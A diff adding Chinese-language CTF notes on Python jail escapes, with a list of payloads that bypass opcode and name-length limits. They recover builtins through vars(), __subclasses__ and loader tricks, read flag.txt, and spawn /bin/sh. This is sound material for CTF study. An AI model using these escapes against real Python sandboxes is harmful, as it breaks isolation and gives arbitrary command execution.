@@ -369,7 +369,62 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
   - `𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()`
   - `𝑒𝓍𝑒𝒸(𝒾𝓃𝓅𝓊𝓉())`
   - `𝘦𝘹𝘦𝘤(𝘪𝘯𝘱𝘶𝘵())`
+- 类似[fast-forward](https://ebonyx.notion.site/misc-fast-forward-v2-40c53a6a56ff4ad19523524065b2c9c3)的pyjial： 限制可使用的操作码和字节码，以及标识符的长度（the opcodes the bytecode is allowed to contain and the lengths of the identifiers, or “names” that we can use）。例如，只能使用5个字符长度以下的函数（print之类的，breakpoint就不行。不过字符串不限制长度）。以下是此类型题可用payload：
+  - `bt=vars(vars(type.mro(type)[1])['__getattribute__'](all,'__self__'));imp=bt['__import__'];bt['print'](bt['getattr'](bt['getattr'](vars(imp('inspect'))['currentframe'](),'f_back'),'f_globals')['flag'])`
+    - 用`object.__getattribute__`替代getattr。此题flag为一个全局变量，在调用输入代码的main函数中可访问。导入inspect模块并使用`inspect.currentframe().f_back`获取父栈帧即可从f_globals中获取。
+  - `(lambda: print((1).__class__.__base__.__subclasses__()[134].__init__.__globals__['system']('/bin/sh')))()`
+    - lambda函数可以“隐藏”函数名和参数名。来源：https://kos0ng.gitbook.io/ctfs/ctfs/write-up/2023/hsctf/misc#fast-forward-26-solves
+  - `E=type('',(),{'__eq__':lambda s,o:o})();x=vars(str)==E;x["count"]=lambda s,o:s` .详情见： https://github.com/python/cpython/issues/88004
+  ```py
+  #去除注释并用分号连接后使用
+  self = vars(type(chr))['__self__']
+  vrs = vars(type(self))['__get__'](self, chr)
+  open = vars(vrs)['open']
+  p = vars(vrs)['print']
+  gat = vars(vrs)['getattr']
+  fp = open('flag.txt', 'r')
+  flag = gat(fp, 'read')()
+  p(flag)
 
+  #或
+
+  # get vars() of <class 'type'>:
+  tvs = vars(type(type(1)))
+  # get __base__ attribute:
+  base = tvs['__base__']
+  # call base.__get__(type(1)) to get <class 'object'>:
+  ot = vars(type(base))['__get__'](base, type(1))
+  # pull getattr from <class 'object'>:
+  gat = vars(ot)['__getattribute__']
+  # get list of all classes:
+  cs = gat(ot, '__subclasses__')()
+  # find BuiltinImporter class:
+  ldr = [x for x in cs if 'BuiltinImporter' in str(x)][0]
+  # get load_module function:
+  ldm = gat(gat(ldr, 'load_module'), '__func__')
+  # load os and sys modules:
+  os = ldm(ldr, 'os')
+  sys = ldm(ldr, 'sys')
+  # os.open(flag.txt):
+  fp = gat(os, 'open')('flag.txt', gat(os, 'O_RDONLY'))
+  # os.read(fp):
+  flag = gat(os, 'read')(fp, 100)
+  # sys.stdout.write(flag.decode()):
+  gat(gat(sys, 'stdout'), 'write')(gat(flag, 'decode')())
+  ```
+  - `x = type.mro(type); x = x[1]; ga = vars(x)['__getattribute__']; sc = ga(x, '__subclasses__')(); pr = sc[136]('fleg',''); vars(pr)['_Printer__filenames'] = ['flag.txt']; pr()`,需要爆破`_Printer`的索引
+  - `o=type(()).mro()[1];g=vars(o)['__getattribute__'];b=g(chr,'__self__');i=g(b,'__import__');o=i('os');s=g(o,'system');s("python -c \"print(open('flag.txt').read())\"")`
+  ```py
+  vars(vars()["license"])["_Printer__lines"]=None
+  print(vars(vars()["license"])["_Printer__lines"])
+  vars(vars()["license"])["_Printer__filenames"]=["flag.txt"]
+  print(vars()["license"]())
+  ```
+  - `exit(vars(vars(type)["__subclasses__"](type.mro(type({}))[1])[99])['get_data'](vars(type)["__subclasses__"](type.mro(type({}))[1])[99]('flag.txt','./'),'flag.txt'))`
+  - `x = vars(); a = [ x[k] for k in x.keys() ][:-1];aa = a[76];ga = vars(aa)['__getattribute__'];scs = ga(ga(aa,'__base__'),'__subclasses__')(); o = ga(scs[84],'load_module')('os'); vars(o)['system']('/bin/bash')`
+  - `[1 for _ in '']+[x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close'][0]['system']('/bin/sh')`
+  - `(lambda:__loader__.load_module("os").system("/bin/sh"))()`
+  - `(lambda:().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["__import__"]("os").system("/bin/sh"))()`
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 
 ```python
